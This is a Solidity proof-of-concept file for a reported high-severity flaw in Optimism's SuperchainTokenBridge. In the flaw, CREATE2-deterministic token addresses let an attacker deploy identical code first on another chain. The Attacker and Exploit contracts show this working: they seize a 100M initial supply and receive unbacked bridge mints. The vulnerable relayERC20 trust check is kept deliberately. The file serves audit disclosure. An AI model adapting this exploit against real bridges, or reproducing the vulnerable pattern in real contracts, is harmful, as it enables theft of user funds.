// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Optimism Interop / SuperchainTokenBridge
    Finding 50077 (Spearbit, Zach Obront) — HIGH

    "Malicious tokens can be deployed at deterministic addresses on other
     chains to steal funds."

    Root cause: the SuperchainTokenBridge assumes a token has the SAME address
    on every interop chain. In relayERC20() it blindly calls
        ISuperchainERC20(_token).crosschainMint(_to, _amount);
    on whatever contract lives at `_token` on THIS chain. Tokens are deployed
    through a generic CREATE2 factory, so a token's address depends ONLY on
    (factory, salt, initCode) — NEVER on the deployer. Because the same factory
    exists on every chain and the init code is identical, an attacker can:
      (a) deploy identical token code at the SAME canonical address on a chain
          where the honest project has not deployed yet, and claim the supply
          minted by initialize() (mints to msg.sender — deployer-independent); and
      (b) have the bridge mint the "legit" canonical token to them, since the
          bridge trusts the address == the same token everywhere.

    This file is a self-contained, cheatcode-free reduction that collapses the
    two interop chains into one EVM. It preserves:
      * SuperchainUSDC.initialize()/name()/symbol() VERBATIM from the finding
        (mint 100_000_000e18 to msg.sender in initialize()),
      * the generic CREATE2 factory (deploy + computeAddress, finding's interface),
      * the VERBATIM vulnerable bridge line
        `ISuperchainERC20(_token).crosschainMint(_to, _amount);`.

    The bridge address is modeled as an immutable constructor arg (the real
    system uses the fixed predeploy Predeploys.SUPERCHAIN_TOKEN_BRIDGE, identical
    on every chain); it is identical across all deployments, so it does NOT
    affect the deployer-independent CREATE2 address.
//////////////////////////////////////////////////////////////////////////*/

interface ISuperchainERC20 {
    function crosschainMint(address _to, uint256 _amount) external;
    function crosschainBurn(address _from, uint256 _amount) external;
}

/// @notice Minimal SuperchainERC20 base: an ERC20 whose cross-chain mint/burn is
///         gated to the (trusted) bridge predeploy.
abstract contract SuperchainERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 internal _totalSupply;

    // In the real system this is the fixed predeploy Predeploys.SUPERCHAIN_TOKEN_BRIDGE
    // (identical address on every chain). Modeled as an immutable here so the PoC is
    // self-contained. It is identical across deployments, so the CREATE2 address stays
    // deployer-independent.
    address public immutable bridge;

    constructor(address bridge_) {
        bridge = bridge_;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function _mint(address to, uint256 amount) internal {
        _totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        _totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // Only the trusted bridge may cross-chain mint/burn. The BUG is NOT here — it is
    // that the bridge (SuperchainTokenBridge.relayERC20) trusts the TOKEN ADDRESS it
    // is told to mint on, and that address is attacker-controllable via CREATE2.
    function crosschainMint(address _to, uint256 _amount) external {
        require(msg.sender == bridge, "Unauthorized");
        _mint(_to, _amount);
    }

    function crosschainBurn(address _from, uint256 _amount) external {
        require(msg.sender == bridge, "Unauthorized");
        _burn(_from, _amount);
    }
}

/// @notice The vulnerable token pattern (VERBATIM from the finding): initial supply is
///         allocated in initialize() to msg.sender, so whoever calls it first on a given
///         chain owns the 100M — and CREATE2 makes the token's address the same everywhere.
contract SuperchainUSDC is SuperchainERC20 {
    // PoC-only: forwards the fixed predeploy bridge address to the base. Not part of the
    // finding's contract (which hardcodes the predeploy); identical across deployments.
    constructor(address bridge_) SuperchainERC20(bridge_) {}

    function initialize() external {
        require(totalSupply() == 0, "already initialized");
        _mint(msg.sender, 100_000_000e18);
    }

    function name() public pure returns (string memory) {
        return "Superchain USDC";
    }

    function symbol() public pure returns (string memory) {
        return "USDC";
    }
}

/// @notice Generic CREATE2 factory (the finding's Create2Factory interface). The deployed
///         address is a function of (factory, salt, initCode) ONLY — never the caller.
contract Create2Factory {
    function deploy(uint256 value, bytes32 salt, bytes memory code) external returns (address addr) {
        assembly {
            addr := create2(value, add(code, 0x20), mload(code), salt)
            if iszero(addr) { revert(0, 0) }
        }
    }

    function computeAddress(bytes32 salt, bytes32 codeHash) external view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, codeHash)))));
    }
}

/// @notice Reduced SuperchainTokenBridge. Preserves the VERBATIM trust assumption in
///         relayERC20 that makes the same-address == same-token assumption exploitable.
contract SuperchainTokenBridge {
    // Models the L2ToL2CrossDomainMessenger / CrossL2Inbox that delivers the relay message.
    address public immutable messenger;

    constructor(address messenger_) {
        messenger = messenger_;
    }

    /// @notice Source side: burns on this chain and encodes the SOURCE token address into
    ///         the message, which is relayed as-is to the destination chain.
    function sendERC20(address _token, address _to, uint256 _amount) external returns (bytes memory message) {
        ISuperchainERC20(_token).crosschainBurn(msg.sender, _amount);
        // trusts that `_token` names the same token on the destination chain:
        message = abi.encodeCall(this.relayERC20, (_token, msg.sender, _to, _amount));
    }

    /// @notice Destination side: mints on whatever contract lives at `_token` on THIS chain,
    ///         assumed identical to the source token because it shares the canonical CREATE2
    ///         address. That assumption is attacker-controllable.
    function relayERC20(address _token, address _from, address _to, uint256 _amount) external {
        require(msg.sender == messenger, "Unauthorized");
        // @> VULN: trusts `_token` has the same address == the same token on both chains.
        //          Fix: bind the source-chain token identity into the message and verify it
        //          here (e.g. require a canonical/authorized deployer, or a chain-scoped
        //          token registry), instead of blindly minting on the received address.
        ISuperchainERC20(_token).crosschainMint(_to, _amount);
    }
}

/// @notice The honest project. It pre-computes where "its" token WILL live so it can wire
///         up integrations in advance. This prediction is deployer-INDEPENDENT — exactly
///         what the attack abuses.
contract HonestProject {
    function predictTokenAddress(Create2Factory factory, bytes32 salt, bytes memory initCode)
        external
        view
        returns (address)
    {
        return factory.computeAddress(salt, keccak256(initCode));
    }
}

/// @notice The attacker. On a freshly-added interop chain, it deploys identical token code
///         at the canonical CREATE2 address and initialize()s to grab the 100M supply, then
///         receives unlimited unbacked mints via the trusting bridge.
contract Attacker {
    function claimCanonicalToken(Create2Factory factory, bytes32 salt, bytes memory initCode)
        external
        returns (address token)
    {
        // Deployer-independent: lands at the SAME address the honest project pre-computed.
        token = factory.deploy(0, salt, initCode);
        // msg.sender inside initialize() is THIS Attacker => the 100M is minted here.
        SuperchainUSDC(token).initialize();
    }
}

/// @notice Orchestrates the whole attack in one transaction, cheatcode-free. The Exploit is
///         the deployer/orchestrator; the profit surfaces as an ERC20 balance on the Attacker
///         contract, denominated in the canonical (honest-expected) SuperchainUSDC.
contract Exploit {
    uint256 public constant INITIAL_SUPPLY = 100_000_000e18; // minted by initialize()
    uint256 public constant BRIDGED_AMOUNT = 1_000_000_000e18; // "unlimited" mint via the bridge

    bytes32 public constant SALT = bytes32(0);
    // A plausible honest source-chain sender in the relayed message. Holds nothing here.
    address public constant HONEST_SENDER = address(uint160(uint256(keccak256("honest source-chain sender"))));

    Create2Factory public factory;
    SuperchainTokenBridge public bridge;
    Attacker public attacker;
    HonestProject public honest;

    address public canonicalToken; // address the honest project expected ITS token to live at
    address public attackerDeployed; // address the attacker actually deployed identical code to

    constructor() {
        // CREATE order (this Exploit is the deployer):
        //   nonce 1: Create2Factory
        //   nonce 2: SuperchainTokenBridge (messenger = this Exploit; models the cross-domain inbox)
        //   nonce 3: Attacker
        //   nonce 4: HonestProject
        // The canonical SuperchainUSDC is deployed later, in run(), via CREATE2 through the factory.
        factory = new Create2Factory();
        bridge = new SuperchainTokenBridge(address(this));
        attacker = new Attacker();
        honest = new HonestProject();
    }

    function run() external {
        // Identical token init code on every interop chain (creation code + the fixed
        // predeploy bridge address). Identical init code + same factory => same address.
        bytes memory initCode = abi.encodePacked(type(SuperchainUSDC).creationCode, abi.encode(address(bridge)));

        // (1) Honest project pre-computes where its token WILL live (deployer-independent).
        canonicalToken = honest.predictTokenAddress(factory, SALT, initCode);

        // (1') Attacker wins the race on a freshly-added interop chain: deploys identical code
        //      at that very address and initialize()s to capture the 100M initial supply.
        attackerDeployed = attacker.claimCanonicalToken(factory, SALT, initCode);

        // Deployer-independence proof: the attacker landed at the honest-expected address.
        require(attackerDeployed == canonicalToken, "CREATE2 address was not deployer-independent");

        SuperchainUSDC token = SuperchainUSDC(canonicalToken);

        // HARM #1: attacker now holds the 100M initial supply at the honest-expected address.
        require(token.balanceOf(address(attacker)) == INITIAL_SUPPLY, "attacker did not capture initial supply");
        require(token.balanceOf(HONEST_SENDER) == 0, "honest should hold nothing");

        // (2) A cross-chain transfer of the canonical token is "delivered". The bridge TRUSTS
        //     the token address and mints to the attacker. No deposit/lock happened on THIS
        //     chain, so this is pure unbacked inflation of the "legit" canonical token.
        bridge.relayERC20(canonicalToken, HONEST_SENDER, address(attacker), BRIDGED_AMOUNT);

        // HARM #2: attacker balance inflated by the full bridged amount with zero backing here.
        require(
            token.balanceOf(address(attacker)) == INITIAL_SUPPLY + BRIDGED_AMOUNT,
            "bridge did not mint unbacked supply to attacker"
        );
        require(token.totalSupply() == INITIAL_SUPPLY + BRIDGED_AMOUNT, "supply accounting mismatch");
    }
}
